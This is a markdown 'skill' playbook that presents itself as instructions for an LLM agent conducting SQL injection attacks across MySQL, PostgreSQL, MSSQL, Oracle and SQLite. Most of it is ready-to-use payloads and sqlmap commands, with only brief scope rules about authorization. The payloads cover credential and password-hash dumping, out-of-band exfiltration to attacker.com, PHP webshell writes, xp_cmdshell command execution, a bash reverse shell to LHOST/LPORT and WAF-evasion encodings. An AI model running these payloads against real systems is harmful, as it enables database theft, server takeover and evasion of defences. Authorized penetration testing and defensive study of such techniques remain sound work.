# SQL Injection Skill

## Overview
Complete methodology for detecting, exploiting, and escalating SQL injection vulnerabilities.
Covers all injection types, all major DBMS backends, WAF bypass, and post-exploitation via SQLi.
This is the LLM agent's step-by-step playbook — follow it top to bottom.

## Scope Rules
1. Only operate on explicitly in-scope applications and parameters.
2. External targets: exploitation or data extraction requires explicit authorization (`external_exploit=explicit_only`).
3. Prefer read-only queries and minimal data extraction for proof of concept.
4. Avoid stacked queries, file operations, or OS shells unless explicitly authorized.
5. Record ALL payloads used and responses received.

---

## Phase 1: Detection — Finding Injection Points

### 1.1 Input Discovery
Identify every user-controllable input:
- **GET parameters:** `?id=1&search=test`
- **POST body:** form fields, JSON keys, XML values
- **HTTP headers:** `Cookie`, `Referer`, `User-Agent`, `X-Forwarded-For`
- **URL path segments:** `/api/users/123/profile`
- **JSON/XML payloads:** Nested keys in API requests

### 1.2 Initial Probe — Single-Character Tests
Start with minimal disruption. Inject into each parameter one at a time:

```
'          → Look for SQL error messages
"          → Alternative quote test
\          → Escape character — may cause syntax error
`          → MySQL backtick — triggers error if parsed
;          → Statement terminator — watch for behavior change
)          → Close parenthesis — common in WHERE clauses
'))        → Double close — nested queries
```

**What to watch for:**
- HTTP 500 / Internal Server Error
- Database error messages (syntax, unterminated string, etc.)
- Different response length, content, or redirect behavior
- Response time changes (>2 seconds indicates time-based potential)

### 1.3 Boolean-Based Detection
Send true/false pairs and compare responses:

```sql
-- Numeric context
1 AND 1=1          → Should return normal response
1 AND 1=2          → Should return different response (fewer results, blank, etc.)

-- String context
' AND '1'='1       → True condition
' AND '1'='2       → False condition

-- With comment termination
' AND 1=1-- -
' AND 1=2-- -

-- URL-encoded
%27%20AND%201%3D1--%20-
%27%20AND%201%3D2--%20-
```

**Decision:** If true/false produce DIFFERENT responses → Boolean-based SQLi confirmed.

### 1.4 Error-Based Detection
Look for verbose database errors in responses:

```sql
' AND 1=CONVERT(int,'a')-- -          → MSSQL type conversion error
' AND 1=1::int-- -                    → PostgreSQL cast error  
' AND extractvalue(1,concat(0x7e,version()))-- -  → MySQL/MariaDB
' AND updatexml(1,concat(0x7e,version()),1)-- -   → MySQL/MariaDB
' AND 1=ctxsys.drithsx.sn(1,'a')-- -             → Oracle
```

**Decision:** If error message includes DB version/type info → Error-based SQLi confirmed.

### 1.5 Time-Based Blind Detection
When no visible difference exists between true/false:

```sql
-- MySQL
' AND IF(1=1,SLEEP(3),0)-- -
' AND BENCHMARK(5000000,SHA1('test'))-- -

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END-- -
' AND 1=(SELECT 1 FROM pg_sleep(3))-- -

-- MSSQL
'; WAITFOR DELAY '0:0:3'-- -
'; IF (1=1) WAITFOR DELAY '0:0:3'-- -

-- SQLite
' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))-- -

-- Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)-- -
```

**Decision:** If response takes ~3 seconds longer → Time-based blind SQLi confirmed.

### 1.6 UNION-Based Detection
Determine number of columns in the original query:

```sql
-- Increment NULL count until no error
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
-- Continue until error disappears

-- Alternative: ORDER BY method
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
-- When ORDER BY N errors, there are N-1 columns

-- Find string-displayable columns
' UNION SELECT 'a',NULL,NULL-- -
' UNION SELECT NULL,'a',NULL-- -
' UNION SELECT NULL,NULL,'a'-- -
```

**Decision:** If UNION query returns data inline → UNION-based SQLi confirmed.

### 1.7 Out-of-Band (OOB) Detection
When the app has no visible output or timing differences:

```sql
-- MySQL (requires FILE privilege and DNS resolution)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\share'))-- -

-- MSSQL (xp_dirtree for DNS)
'; EXEC master..xp_dirtree '\\attacker.com\share'-- -

-- Oracle (UTL_HTTP)
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||version) FROM dual-- -

-- PostgreSQL (COPY ... TO PROGRAM or dblink)
'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/'-- -
```

**Requires:** Collaborator/Burp Collaborator or webhook.site to catch OOB callbacks.

---

## Phase 2: DBMS Fingerprinting

### 2.1 Error Message Fingerprinting
| Error Pattern | DBMS |
|---|---|
| `You have an error in your SQL syntax` | MySQL / MariaDB |
| `ERROR: syntax error at or near` | PostgreSQL |
| `Unclosed quotation mark after` | Microsoft SQL Server |
| `ORA-01756: quoted string not properly terminated` | Oracle |
| `near "...": syntax error` | SQLite |
| `SQLSTATE[HY000]` (via PHP PDO) | Check inner message for DB type |

### 2.2 Version Query Fingerprinting
```sql
-- MySQL / MariaDB
SELECT @@version           → "5.7.39" or "10.6.12-MariaDB"
SELECT version()           → Same

-- PostgreSQL
SELECT version()           → "PostgreSQL 15.3 on x86_64..."

-- MSSQL
SELECT @@version           → "Microsoft SQL Server 2019..."
SELECT SERVERPROPERTY('productversion')

-- Oracle
SELECT banner FROM v$version WHERE ROWNUM=1   → "Oracle Database 19c..."
SELECT version FROM v$instance

-- SQLite
SELECT sqlite_version()    → "3.39.0"
```

### 2.3 Behavioral Fingerprinting
| Test | MySQL | PostgreSQL | MSSQL | Oracle | SQLite |
|---|---|---|---|---|---|
| `CONCAT('a','b')` | ✅ `ab` | ✅ `ab` | ❌ | ✅ `ab` | ❌ |
| `'a'\|\|'b'` | ❌ `0` | ✅ `ab` | ❌ | ✅ `ab` | ✅ `ab` |
| `'a'+'b'` | ❌ | ❌ | ✅ `ab` | ❌ | ❌ |
| `SELECT 1 FROM dual` | ✅ | ❌ | ❌ | ✅ (required) | ❌ |
| `SELECT 1` (no FROM) | ✅ | ✅ | ✅ | ❌ | ✅ |
| `LIMIT 1` | ✅ | ✅ | ❌ | ❌ | ✅ |
| `TOP 1` | ❌ | ❌ | ✅ | ❌ | ❌ |
| `ROWNUM <= 1` | ❌ | ❌ | ❌ | ✅ | ❌ |

---

## Phase 3: Exploitation — Data Extraction

### 3.1 MySQL Exploitation

**Schema Enumeration:**
```sql
-- List databases
' UNION SELECT GROUP_CONCAT(schema_name),NULL FROM information_schema.schemata-- -

-- List tables in a database
' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema='target_db'-- -

-- List columns in a table
' UNION SELECT GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='users'-- -

-- Extract data
' UNION SELECT GROUP_CONCAT(username,0x3a,password),NULL FROM target_db.users-- -
```

**Blind Extraction (Boolean):**
```sql
-- Extract database name character by character
' AND SUBSTRING(database(),1,1)='a'-- -
' AND SUBSTRING(database(),1,1)='b'-- -
-- Or binary search with ASCII
' AND ASCII(SUBSTRING(database(),1,1))>96-- -
' AND ASCII(SUBSTRING(database(),1,1))>109-- -
-- Continue binary search to narrow down
```

**Blind Extraction (Time-Based):**
```sql
' AND IF(ASCII(SUBSTRING(database(),1,1))>96,SLEEP(2),0)-- -
```

### 3.2 PostgreSQL Exploitation

**Schema Enumeration:**
```sql
-- List databases
' UNION SELECT string_agg(datname,','),NULL FROM pg_database-- -

-- List tables
' UNION SELECT string_agg(tablename,','),NULL FROM pg_tables WHERE schemaname='public'-- -

-- List columns
' UNION SELECT string_agg(column_name,','),NULL FROM information_schema.columns WHERE table_name='users'-- -

-- Extract data
' UNION SELECT string_agg(username||':'||password,','),NULL FROM users-- -
```

**Stacked Queries (PostgreSQL supports them natively):**
```sql
'; CREATE TABLE exfil(data text); COPY exfil FROM '/etc/passwd'; SELECT * FROM exfil-- -
```

### 3.3 Microsoft SQL Server Exploitation

**Schema Enumeration:**
```sql
-- List databases
' UNION SELECT name,NULL FROM master..sysdatabases-- -

-- List tables
' UNION SELECT name,NULL FROM target_db..sysobjects WHERE xtype='U'-- -

-- List columns
' UNION SELECT name,NULL FROM syscolumns WHERE id=OBJECT_ID('users')-- -

-- Extract data
' UNION SELECT username+':'+password,NULL FROM users-- -
```

**Error-Based Extraction (forced type conversion):**
```sql
' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))-- -
' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users WHERE username NOT IN ('admin')))-- -
```

**Stacked Queries:**
```sql
'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\output.html','SELECT * FROM users'-- -
```

### 3.4 Oracle Exploitation

**Schema Enumeration:**
```sql
-- List tables (current user)
' UNION SELECT table_name,NULL FROM all_tables WHERE ROWNUM<=20-- -

-- List columns
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'-- -

-- Extract data (Oracle requires FROM dual or a table)
' UNION SELECT username||':'||password,NULL FROM users WHERE ROWNUM<=5-- -
```

**Error-Based (XMLType):**
```sql
' AND 1=utl_inaddr.get_host_address((SELECT user FROM dual))-- -
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- -
```

### 3.5 SQLite Exploitation

**Schema Enumeration:**
```sql
-- List tables
' UNION SELECT GROUP_CONCAT(name),NULL FROM sqlite_master WHERE type='table'-- -

-- List table schema (CREATE statement)
' UNION SELECT sql,NULL FROM sqlite_master WHERE name='users'-- -

-- Extract data
' UNION SELECT GROUP_CONCAT(username||':'||password),NULL FROM users-- -
```

---

## Phase 4: Privilege Escalation via SQLi

### 4.1 File Read (Requires Explicit Authorization)

```sql
-- MySQL (requires FILE privilege)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -
' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL-- -
' UNION SELECT LOAD_FILE('C:\\inetpub\\wwwroot\\web.config'),NULL-- -

-- PostgreSQL
'; CREATE TABLE tmp(data text); COPY tmp FROM '/etc/passwd'; SELECT * FROM tmp-- -
-- Or with pg_read_file (superuser)
' UNION SELECT pg_read_file('/etc/passwd',0,10000),NULL-- -

-- MSSQL (OPENROWSET — requires sysadmin)
' UNION SELECT * FROM OPENROWSET(BULK 'C:\windows\system32\drivers\etc\hosts',SINGLE_CLOB) AS x-- -
```

### 4.2 File Write / Webshell Upload (Requires Explicit Authorization)

```sql
-- MySQL INTO OUTFILE (requires FILE privilege + writable web root)
' UNION SELECT '<?php system($_GET["c"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'-- -
' UNION SELECT '<?php system($_GET["c"]); ?>',NULL INTO DUMPFILE '/var/www/html/shell.php'-- -

-- PostgreSQL COPY TO
'; COPY (SELECT '<?php system($_GET["c"]); ?>') TO '/var/www/html/shell.php'-- -

-- MSSQL via xp_cmdshell
'; EXEC xp_cmdshell 'echo ^<?php system($_GET["c"]); ?^> > C:\inetpub\wwwroot\shell.php'-- -
```

### 4.3 OS Command Execution (Requires Explicit Authorization)

```sql
-- MSSQL xp_cmdshell (must be enabled)
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE-- -
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- -
'; EXEC xp_cmdshell 'whoami'-- -
'; EXEC xp_cmdshell 'powershell -e <BASE64_PAYLOAD>'-- -

-- PostgreSQL COPY TO PROGRAM (9.3+, superuser)
'; COPY (SELECT '') TO PROGRAM 'id > /tmp/output.txt'-- -
'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"'-- -

-- MySQL UDF (requires write + plugin dir access)
-- 1. Write UDF shared object
-- 2. CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
-- 3. SELECT sys_exec('id');

-- Oracle (Java procedures, requires CREATE PROCEDURE)
-- Complex multi-step: create Java source, create function, call it
```

### 4.4 Credential Extraction

```sql
-- MySQL user hashes
' UNION SELECT GROUP_CONCAT(user,0x3a,authentication_string),NULL FROM mysql.user-- -

-- PostgreSQL user hashes
' UNION SELECT string_agg(usename||':'||passwd,','),NULL FROM pg_shadow-- -

-- MSSQL login hashes
' UNION SELECT name+':'+master.dbo.fn_varbintohexstr(password_hash),NULL FROM sys.sql_logins-- -

-- Oracle password hashes (DBA required)
' UNION SELECT username||':'||password,NULL FROM dba_users-- -
```

---

## Phase 5: WAF Bypass Techniques

### 5.1 Encoding Bypasses
```sql
-- URL encoding
%27%20UNION%20SELECT%201,2,3--%20-

-- Double URL encoding
%2527%2520UNION%2520SELECT%25201%252C2%252C3--%2520-

-- Unicode encoding
%u0027%u0020UNION%u0020SELECT%u00201,2,3--

-- Hex encoding (MySQL)
' UNION SELECT 0x3C3F706870206563686F2073797374656D28245F4745545B2263225D293B3F3E,NULL-- -
```

### 5.2 Comment Injection
```sql
-- Inline comments to break up keywords
UN/**/ION SE/**/LECT 1,2,3
/*!50000UNION*/ /*!50000SELECT*/ 1,2,3

-- MySQL version-conditioned comments
/*!UNION*/ /*!SELECT*/ 1,2,3
' /*!50000%55nion*/ /*!50000%53elect*/ 1,2,3-- -
```

### 5.3 Case and Whitespace Manipulation
```sql
-- Mixed case
uNiOn SeLeCt 1,2,3
UnIoN/**/sElEcT/**/1,2,3

-- Alternative whitespace
' UNION%09SELECT%091,2,3-- -       → Tab character
' UNION%0ASELECT%0A1,2,3-- -      → Newline
' UNION%0DSELECT%0D1,2,3-- -      → Carriage return
' UNION%0D%0ASELECT 1,2,3-- -     → CRLF
' UNION%A0SELECT%A01,2,3-- -      → Non-breaking space (MySQL specific)
```

### 5.4 Keyword Replacement
```sql
-- BETWEEN instead of comparison
' AND 1 BETWEEN 1 AND 1-- -

-- LIKE instead of =
' AND 1 LIKE 1-- -

-- IN() instead of =
' AND 1 IN (1)-- -

-- String without quotes (MySQL hex)
SELECT * FROM users WHERE username=0x61646D696E   → 'admin'

-- CHAR() function
SELECT * FROM users WHERE username=CHAR(97,100,109,105,110)
```

### 5.5 HTTP Parameter Pollution & Chunked Transfer
```
-- Parameter pollution (different frameworks parse differently)
?id=1&id=' UNION SELECT 1,2,3-- -

-- Chunked transfer encoding (bypass WAF that doesn't reassemble)
Transfer-Encoding: chunked
-- Break payload across chunks

-- JSON/XML injection (bypass URL-param-only WAFs)
{"id":"1 UNION SELECT 1,2,3-- -"}
```

### 5.6 sqlmap Tamper Scripts
```bash
# Common WAF bypass tampers
sqlmap -u URL --tamper=space2comment          # Replace spaces with /**/
sqlmap -u URL --tamper=between                # Replace > with NOT BETWEEN 0 AND
sqlmap -u URL --tamper=randomcase             # Randomize keyword casing
sqlmap -u URL --tamper=charencode             # URL-encode all characters
sqlmap -u URL --tamper=equaltolike            # Replace = with LIKE
sqlmap -u URL --tamper=greatest               # Replace > with GREATEST
sqlmap -u URL --tamper=space2hash             # Replace spaces with # + newline
sqlmap -u URL --tamper=space2mssqlblank       # MSSQL alternative whitespace
sqlmap -u URL --tamper=percentage             # Add % in front of each char (IIS)

# Chain multiple tampers
sqlmap -u URL --tamper=space2comment,between,randomcase,charencode

# Full aggressive WAF bypass
sqlmap -u URL --tamper=space2comment,between,randomcase --random-agent --delay=2 --technique=T
```

---

## Phase 6: sqlmap Mastery

### 6.1 Basic Usage
```bash
# GET parameter
sqlmap -u "http://target/page?id=1" --batch

# POST parameter
sqlmap -u "http://target/page" --data="id=1&name=test" --batch

# With cookies (authenticated testing)
sqlmap -u "http://target/page?id=1" --cookie="session=abc123" --batch

# From Burp request file
sqlmap -r request.txt --batch
```

### 6.2 Enumeration Flags
```bash
# Database enumeration
sqlmap -u URL --batch --dbs                        # List databases
sqlmap -u URL --batch -D target_db --tables        # List tables
sqlmap -u URL --batch -D target_db -T users --columns   # List columns
sqlmap -u URL --batch -D target_db -T users --dump      # Dump table

# Specific columns only
sqlmap -u URL --batch -D target_db -T users -C "username,password" --dump

# Current user/database
sqlmap -u URL --batch --current-user
sqlmap -u URL --batch --current-db
sqlmap -u URL --batch --is-dba

# Password hashes
sqlmap -u URL --batch --passwords
```

### 6.3 Technique-Specific Flags
```bash
# Force specific technique
sqlmap -u URL --technique=B    # Boolean-based blind
sqlmap -u URL --technique=E    # Error-based
sqlmap -u URL --technique=U    # UNION-based
sqlmap -u URL --technique=S    # Stacked queries
sqlmap -u URL --technique=T    # Time-based blind
sqlmap -u URL --technique=Q    # Inline (out-of-band)

# Multiple techniques
sqlmap -u URL --technique=BEUST

# Increase detection depth
sqlmap -u URL --level=5 --risk=3    # Max detection (tests headers, cookies, etc.)

# Time-based tuning
sqlmap -u URL --technique=T --time-sec=3
```

### 6.4 Advanced sqlmap
```bash
# DBMS-specific optimization
sqlmap -u URL --dbms=mysql --batch
sqlmap -u URL --dbms=postgresql --batch
sqlmap -u URL --dbms=mssql --batch

# Second-order injection
sqlmap -u "http://target/register" --data="user=test" --second-url="http://target/profile" --batch

# JSON body
sqlmap -u "http://target/api/search" --data='{"query":"test"}' --batch

# Custom injection point
sqlmap -u "http://target/api/users" --data="id=1*" --batch   # * marks injection point

# Header injection
sqlmap -u URL --headers="X-Forwarded-For: 1*" --batch

# OS shell (if writable web root + FILE priv)
sqlmap -u URL --os-shell --batch
sqlmap -u URL --os-cmd="id" --batch

# File read/write
sqlmap -u URL --file-read="/etc/passwd" --batch
sqlmap -u URL --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch

# Proxy through Burp
sqlmap -u URL --proxy="http://127.0.0.1:8080" --batch

# Output parsing
sqlmap -u URL --batch --output-dir=/tmp/sqli_output
```

### 6.5 Database-Specific sqlmap Flags
```bash
# MySQL
sqlmap -u URL --dbms=mysql --technique=BEUST --batch

# PostgreSQL (supports stacked queries natively)
sqlmap -u URL --dbms=postgresql --technique=BEUSTS --batch

# MSSQL (xp_cmdshell, stacked queries)
sqlmap -u URL --dbms=mssql --technique=BEUSTS --batch
sqlmap -u URL --dbms=mssql --os-shell --batch    # Uses xp_cmdshell

# Oracle
sqlmap -u URL --dbms=oracle --technique=BEU --batch

# SQLite
sqlmap -u URL --dbms=sqlite --technique=BEU --batch
```

---

## Phase 7: Second-Order and Advanced Injection

### 7.1 Second-Order SQLi
Payload injected in one location, triggered in another:
1. Register with username: `admin'-- -`
2. Login as that user
3. Visit profile page → if it queries `SELECT * FROM users WHERE username='admin'-- -'`
4. The profile now returns admin's data

**Testing approach:**
- Inject payloads into registration, profile update, feedback forms
- Check other pages (admin panel, reports, exports) for triggering
- Use `sqlmap --second-url` for automated detection

### 7.2 Stored Procedure Injection
```sql
-- If app calls stored procedure
'; EXEC sp_executesql N'SELECT * FROM users WHERE id=1 UNION SELECT 1,2,3-- -'-- -

-- MSSQL linked servers
'; EXEC sp_linkedservers-- -
'; EXEC ('SELECT * FROM users') AT [linked_server_name]-- -
```

### 7.3 JSON/XML Injection Contexts
```json
// JSON body injection
{"id":"1 UNION SELECT 1,2,3-- -"}
{"id":"1\" UNION SELECT 1,2,3-- -"}

// Nested JSON
{"search":{"query":"1' UNION SELECT 1,2,3-- -"}}
```

```xml
<!-- XML body injection -->
<search><query>1' UNION SELECT 1,2,3-- -</query></search>
```

### 7.4 NoSQL Injection (Adjacent Technique)
```json
// MongoDB authentication bypass
{"username":{"$ne":""},"password":{"$ne":""}}
{"username":"admin","password":{"$gt":""}}

// MongoDB data extraction
{"username":{"$regex":"^a.*"},"password":{"$ne":""}}

// MongoDB operator injection via URL params
?username[$ne]=invalid&password[$ne]=invalid
```

---

## Decision Tree — Complete SQLi Attack Flow

```
INPUT FOUND → Inject ' or "
│
├── Error message visible?
│   ├── YES → Error-Based SQLi
│   │   ├── Identify DBMS from error
│   │   ├── Extract version() via error
│   │   └── Enumerate schema via error-based extraction
│   └── NO → Continue testing
│
├── Boolean difference detected? (1=1 vs 1=2)
│   ├── YES → Boolean-Based Blind SQLi
│   │   ├── Binary search character extraction
│   │   └── Extract schema character by character
│   └── NO → Continue testing
│
├── Time delay observed? (SLEEP/WAITFOR)
│   ├── YES → Time-Based Blind SQLi
│   │   ├── Binary search with conditional sleep
│   │   └── Slower but works against most targets
│   └── NO → Continue testing
│
├── UNION returns data inline?
│   ├── YES → UNION-Based SQLi (fastest extraction)
│   │   ├── Determine column count
│   │   ├── Find displayable columns
│   │   └── Extract data directly
│   └── NO → Continue testing
│
├── OOB callback received?
│   ├── YES → Out-of-Band SQLi
│   │   └── Extract data via DNS/HTTP exfiltration
│   └── NO → Possible false negative or WAF blocking
│
└── All tests fail?
    ├── Try WAF bypass techniques (Phase 5)
    ├── Try different quote types (' " `)
    ├── Try different comment styles (-- - # /* */)
    ├── Try header injection (Cookie, Referer, X-Forwarded-For)
    ├── Try second-order injection
    └── Try NoSQL injection if MongoDB/CouchDB suspected
```

---

## Evidence Collection
1. `evidence.json` — parameter, method, DBMS, injection type, proof payloads
2. `findings.json` — validated impact, CVSS score, redacted proof
3. `creds.json` — only when explicitly authorized, always redacted
4. Screenshots of extracted data (redacted)
5. sqlmap output logs

## Evidence Consolidation
Use `parse_sqlmap_log.py` to convert sqlmap logs into `evidence.json`.

## MITRE ATT&CK Mappings
- T1190 — Exploit Public-Facing Application
- T1059 — Command and Scripting Interpreter (via OS shell)
- T1005 — Data from Local System (via file read)

## Deep Dives
Load references when needed:
1. Detection and validation: `references/detection_validation.md`
2. Safe payloads per DBMS: `references/safe_payloads.md`
3. DBMS fingerprinting: `references/dbms_fingerprinting.md`
4. Data extraction techniques: `references/data_extraction.md`
5. WAF bypass encyclopedia: `references/waf_bypass.md`
6. Post-exploitation via SQLi: `references/post_exploitation.md`
7. Explicit-only advanced actions: `references/explicit_only_advanced.md`

## Examples
See `examples/prompt.md` for the complete decision tree and worked examples.

## Success Criteria
- SQL injection confirmed with safe payloads
- DBMS identified with evidence
- Injection type classified (error/boolean/time/union/oob)
- Data extraction demonstrated (minimal proof)
- All payloads and responses documented
- WAF bypass attempted if initial tests blocked
